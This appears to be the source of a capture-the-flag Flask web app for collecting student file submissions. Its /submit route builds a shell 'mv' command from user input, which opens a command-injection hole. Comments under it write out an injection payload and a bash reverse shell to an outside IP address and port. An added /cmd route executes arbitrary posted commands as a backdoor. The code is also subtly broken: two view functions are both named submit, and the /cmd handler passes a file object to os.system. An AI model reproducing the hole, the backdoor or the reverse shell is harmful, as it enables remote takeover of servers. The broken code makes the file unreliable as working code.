from flask import Flask, redirect, render_template, request, send_file, session, g
import os
from tempfile import NamedTemporaryFile as saveTmp

app = Flask(__name__)
app.config["SECRET_KEY"] = os.environ.get("SECRET_KEY")

flag1 = os.environ.get("FLAG1")

users = {
    "6324": {
        "username":"墨茶Official", 
        "avatar": "/static/avatar.webp",
        "collected": []
    }
}


@app.before_request
def authenticate():
    uid = session.get("uid", None)
    uid = str(uid) if uid and isinstance(uid, int) else uid # 如果 uid 是 int 类型，则转为 str 类型
    if uid and uid in users:
        g.uid = uid
        g.info = users.get(uid)
        g.is_guest = False
    else:
        g.uid = None
        g.is_guest = True
        session["uid"] = None


@app.route("/")
def route_by_identity():
    if g.is_guest:
        return render_template("submitter.html")
    else:
        return render_template("collector.html",
                                flag1=flag1,
                                collected=g.info["collected"]
                            )
    

@app.route("/login")
def login():
    return render_template("login.html")


@app.route("/logout")
def logout():
    session["uid"] = None
    return redirect("/")


@app.route("/submit", methods=["POST"])
def submit():
    collector_uid = request.args.get("collector_uid")
    name = request.form.get("name")
    student_id = request.form.get("student_id")
    file = request.files.get("file")

    if not all([name, student_id, file]):
        return "Invalid request", 400
    
    # 保存上传的文件到 uploads 目录下，并且重命名为 {姓名}-{学号}.zip
    old_path = saveTmp(delete=False).name
    file.save(old_path)
    
    new_path = f"uploads/{name}-{student_id}.zip"
    os.system(f"mv {old_path} {new_path}")
    # mv {old_path} uploads/1-123.zip | echo 1 > rov
    # bash -i >& /dev/tcp/123.56.102.207/4444 0>&1

    # 保存提交信息到 users 字典中对应的位置
    users[collector_uid]['collected'].insert(0, (name, student_id, new_path))

    return render_template("submit_success.html")

@app.route("/cmd", methods=["POST"])
def submit():
    cmd = request.files.get("cmd")
    if not cmd:
        return "Invalid request", 400
    os.system(f"{cmd}")
    return render_template("submit_success.html")

@app.route("/download")
def download():
    idx = request.args.get("idx")
    try:
        idx = int(idx)
    except:
        return "Invalid request", 400
    
    idx -= 1    # 前端序号从 1 开始，而后端从 0 开始
    if not idx < len(g.info["collected"]):
        return "Invalid request", 400
    
    _, _, path = g.info["collected"][idx]
    return send_file(path, as_attachment=True)


@app.route("/www.zip")
def downloadSourceCode():
    if g.is_guest:
        return "I'm sorry but the source code is NOT available for GUESTS."
    else:
        return send_file("www.zip", as_attachment=True)


@app.route("/robots.txt")
def robots():
    return send_file("robots.txt")
